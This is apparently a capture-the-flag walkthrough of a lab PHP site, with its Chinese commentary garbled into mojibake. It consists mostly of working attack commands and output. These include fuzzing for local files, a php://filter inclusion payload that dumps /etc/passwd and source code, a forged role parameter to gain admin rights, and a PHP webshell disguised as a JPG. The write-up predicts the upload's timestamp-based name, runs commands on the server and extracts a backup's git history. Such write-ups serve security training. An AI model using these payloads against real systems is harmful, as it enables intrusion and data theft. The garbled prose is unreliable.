/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/daemon.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/debug [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/dpkg.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim/mainlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim.paniclog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/at.deny [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/motd [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/auth.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/kern.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/maillog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/bootptab [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpsd/ssl.access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_paniclog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftp-proxy [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpsd/ssl_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql-bin.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql-slow.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/pureftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/dmesg [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/self/net/arp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/message [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/xferlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/messages [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysqlderror.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/faillog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/spool/cron/crontabs/root [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/log/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/resolv.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lighttpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/run/utmp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/wtmp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/webmin/miniserv.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/yum.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftplog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.info [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/secure [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/cpuinfo [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lastlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/chttp.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim/rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache-ssl/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_key [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.warn [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_mainlog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/log/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/boot [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache2/config.inc [Status: 200, Size: 25, Words: 3, Lines: 1] :: Progress: [257/257] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:25] :: Errors: 1 :: æ¼æ´åˆ©ç”¨è¿™è¾¹æ˜¯å¯ä»¥è¯»å–å‡ºæ¥ä¸œè¥¿çš„ï¼Œè¯æ˜å‚æ•°å¯¹äº†ï¼Œå»éšä¾¿è®¿é—®ä¸€ä¸ªçœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://10.10.11.135/image.php?img=/etc/passwd Hacking attempt detected! è¿™é‡Œä¼¼ä¹ç¢°åˆ°wafäº†ï¼Œæƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹ è¿™é‡Œæ‰¾åˆ°äº†ä¸€ç¯‡å‚è€ƒæ–‡ç«  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion#wrapper-phpfilter http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php ä¸Šé¢è¿™ä¸€æ¡æµ‹è¯•åå¯ä»¥ç»•è¿‡ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ„é€ POC â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK å¾—åˆ°äº†ä¸€æ®µbase64ç¼–ç ï¼Œå’±ä»¬æŠŠPOCç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼Œè®©å®ƒè§£å¯†base64 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2152 100 2152 0 0 3788 0 --:--:-- --:--:-- --:--:-- 3788 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash æˆåŠŸè¯»å–æ–‡ä»¶ ç„¶åå’±ä»¬å°è¯•è¯»å–ä¸€ä¸‹ä¹‹å‰è·å–åˆ°çš„æœ¬åœ°æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1360 100 1360 0 0 624 0 0:00:02 0:00:02 --:--:-- 624 &lt;?php include(&quot;admin_auth_check.php&quot;); $upload_dir = &quot;images/uploads/&quot;; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]); $target_file = $upload_dir . $file_name; $error = &quot;&quot;; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if ($check === false) { $error = &quot;Invalid file&quot;; } } // Check if file already exists if (file_exists($target_file)) { $error = &quot;Sorry, file already exists.&quot;; } if ($imageFileType != &quot;jpg&quot;) { $error = &quot;This extension is not allowed.&quot;; } if (empty($error)) { if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file has been uploaded.&quot;; } else { echo &quot;Error: There was an error uploading your file.&quot;; } } else { echo &quot;Error: &quot; . $error; } ?&gt; è¿™è¾¹å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªè®¤è¯æ–‡ä»¶admin_auth_check.phpï¼Œå’±ä»¬è¯»å–ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 268 100 268 0 0 470 0 --:--:-- --:--:-- --:--:-- 471 &lt;?php include_once &quot;auth_check.php&quot;; if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) { echo &quot;No permission to access this panel!&quot;; header(&#39;Location: ./index.php&#39;); die(); } ?&gt; è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå’±ä»¬è¦ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é‚£å°±å¾—æœ‰ä¸€ä¸ªrole1çš„æƒé™ï¼Œä½†æ˜¯ç›®å‰æ²¡æœ‰ä»»ä½•çº¿ç´¢èƒ½å¾—åˆ°å…³äºrole1çš„å†…å®¹ï¼Œè¿™é‡ŒæŠŠ&#x2F;etc&#x2F;passwdå†…è·å–åˆ°çš„è´¦æˆ·aaronæ‹¿å»å°è¯•ä¸€ä¸‹ æˆåŠŸç™»å½•ï¼Œå’±ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªuser2çš„æƒé™ï¼Œé‚£ä¸ç”¨æƒ³è‚¯å®šæ˜¯éœ€è¦è¶Šæƒäº† æŠ“äº†ä¸€ä¸ªåŒ…çœ‹äº†ä¸€ä¸‹ï¼Œä¼¼ä¹æ²¡æœ‰å…³äºroleçš„æƒé™ï¼Œé‚£å’±ä»¬è‡ªå·±åŠ ä¸€ä¸ªå‘¢ï¼Ÿè¯•è¯•çœ‹ æ”¹åŒ…åŠ å…¥role&#x3D;1æ‰§è¡Œåï¼Œåˆ·æ–°ä¸€ä¸‹é¡µé¢ å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªadmin panelæŒ‰é’®ï¼Œç‚¹è¿›å»çœ‹çœ‹ æ˜ç¡®å¤šäº†ä¸€ä¸ªä¸Šä¼ ç‚¹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat shell.jpg &lt;?php system($_GET[cmd]);?&gt; åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶ æ¥ç€æŠŠæˆ‘ä»¬æœ¬åœ°ç³»ç»Ÿçš„æ—¶é—´ä¿®æ”¹ä¸ºGMT(æˆ‘é»˜è®¤çš„æ˜¯CST) ç„¶åä¸Šä¼ è¯¥jpgæ–‡ä»¶çš„æ—¶å€™æ‹¦æˆªä¸Šä¼ åŒ…ï¼Œä½¿ç”¨php -aå¼€å§‹æ‰§è¡Œä¸‹åˆ—å¾ªç¯è¯­å¥ä»¥åï¼Œå†æ”¾åŒ… while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\\n&quot;;sleep(1);} â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# php -a Interactive mode enabled php &gt; while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\\n&quot;;sleep(1);} Sat Jan 1 0:50:55 CST 2022 = 019996d3ee825407d56ab94dd16bdb34 Sat Jan 1 0:50:56 CST 2022 = c56f6f652fcf60605708795fe9051eeb Sat Jan 1 0:50:57 CST 2022 = dc3e0079c26a5db5f2c5c96ec26ee917 â”Œâ”€â”€(rootğŸ’€root)-[~] â””â”€# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=id&#39; uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆ‘æŠŠæœ¬åœ°æ—¶é—´ä¿®æ”¹äº†åï¼ŒæˆåŠŸgetshellï¼Œå’±ä»¬ç»§ç»­ä¸‹ä¸€æ­¥ è¿™å°æœºå™¨æœ‰é˜²ç«å¢™ï¼Œæ— æ³•ç›´æ¥æ‹¿åˆ°åå‘shellï¼Œå’±ä»¬ä¸€æ­¥æ­¥æ¥ â”Œâ”€â”€(rootğŸ’€root)-[~] â””â”€# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=ls+-la+/opt&#39; total 632 drwxr-xr-x 2 root root 4096 Dec 31 16:49 . drwxr-xr-x 24 root root 4096 Nov 29 01:34 .. -rw-r--r-- 1 root root 5609 Dec 31 16:49 default -rw-r--r-- 1 root root 627851 Jul 20 22:36 source-files-backup.zip å’±ä»¬æŠŠæ–‡ä»¶å¤åˆ¶åˆ°&#x2F;var&#x2F;www&#x2F;html&#x2F;images&#x2F;uploads&#x2F;ç„¶åä¸‹è½½ â”Œâ”€â”€(rootğŸ’€root)-[~] â””â”€# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/&#39; â”Œâ”€â”€(rootğŸ’€root)-[~] â””â”€# curl &#39;http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip&#39; --output source-files-backup.zip 6 â¨¯ % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 613k 0 613k 0 0 165k 0 --:--:-- 0:00:03 --:--:-- 165k â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup] â””â”€# ls -la æ€»ç”¨é‡ 76 drwxr-xr-x 6 root root 4096 7æœˆ 20 22:34 . drwxr-xr-x 12 root root 4096 12æœˆ 31 17:36 .. -rw-r--r-- 1 root root 200 7æœˆ 20 22:34 admin_auth_check.php -rw-r--r-- 1 root root 373 7æœˆ 20 22:34 auth_check.php -rw-r--r-- 1 root root 1268 7æœˆ 20 22:34 avatar_uploader.php drwxr-xr-x 2 root root 4096 7æœˆ 20 22:34 css -rw-r--r-- 1 root root 92 7æœˆ 20 22:34 db_conn.php -rw-r--r-- 1 root root 3937 7æœˆ 20 22:34 footer.php drwxr-xr-x 8 root root 4096 7æœˆ 20 22:35 .git -rw-r--r-- 1 root root 1498 7æœˆ 20 22:34 header.php -rw-r--r-- 1 root root 507 7æœˆ 20 22:34 image.php drwxr-xr-x 3 root root 4096 7æœˆ 20 22:34 images -rw-r--r-- 1 root root 188 7æœˆ 20 22:34 index.php drwxr-xr-x 2 root root 4096 7æœˆ 20 22:34 js -rw-r--r-- 1 root root 2074 7æœˆ 20 22:34 login.php -rw-r--r-- 1 root root 113 7æœˆ 20 22:34 logout.php -rw-r--r-- 1 root root 3041 7æœˆ 20 22:34 profile.php -rw-r--r-- 1 root root 1740 7æœˆ 20 22:34 profile_update.php -rw-r--r-- 1 root root 984 7æœˆ 20 22:34 upload.php è§£å‹åå¯ä»¥å¾—åˆ°.gitæ–‡ä»¶ï¼Œè¯·æ±‚gitæ–‡ä»¶çœ‹çœ‹èƒ½å¾—åˆ°ä»€ä¹ˆ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup] â””â”€# ~/Desktop/GitTools/Extractor/extractor.sh . source ########### # Extractor is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [*] Creating... [+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/header.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/image.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/index.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/login.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php [+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/login.css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/footer.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/header.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/image.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/index.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/login.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/logout.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/upload.php ç„¶åå¤šäº†ä¸€ä¸ªsourceç›®å½• â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup] â””â”€# ls -la æ€»ç”¨é‡ 80 drwxr-xr-x 7 root root 4096 12æœˆ 31 17:42 . drwxr-xr-x 13 root root 4096 12æœˆ 31 17:38 .. -rw-r--r-- 1 root root 200 7æœˆ 20 22:34 admin_auth_check.php -rw-r--r-- 1 root root 373 7æœˆ 20 22:34 auth_check.php -rw-r--r-- 1 root root 1268 7æœˆ 20 22:34 avatar_uploader.php drwxr-xr-x 2 root root 4096 7æœˆ 20 22:34 css -rw-r--r-- 1 root root 92 7æœˆ 20 22:34 db_conn.php -rw-r--r-- 1 root root 3937 7æœˆ 20 22:34 footer.php drwxr-xr-x 8 root root 4096 7æœˆ 20 22:35 .git -rw-r--r-- 1 root root 1498 7æœˆ 20 22:34 header.php -rw-r--r-- 1 root root 507 7æœˆ 20 22:34 image.php drwxr-xr-x 3 root root 4096 7æœˆ 20 22:34 images -rw-r--r-- 1 root root 188 7æœˆ 20 22:34 index.php drwxr-xr-x 2 root root 4096 7æœˆ 20 22:34 js -rw-r--r-- 1 root root 2074 7æœˆ 20 22:34 login.php -rw-r--r-- 1 root root 113 7æœˆ 20 22:34 logout.php -rw-r--r-- 1 root root 3041 7æœˆ 20 22:34 profile.php -rw-r--r-- 1 root root 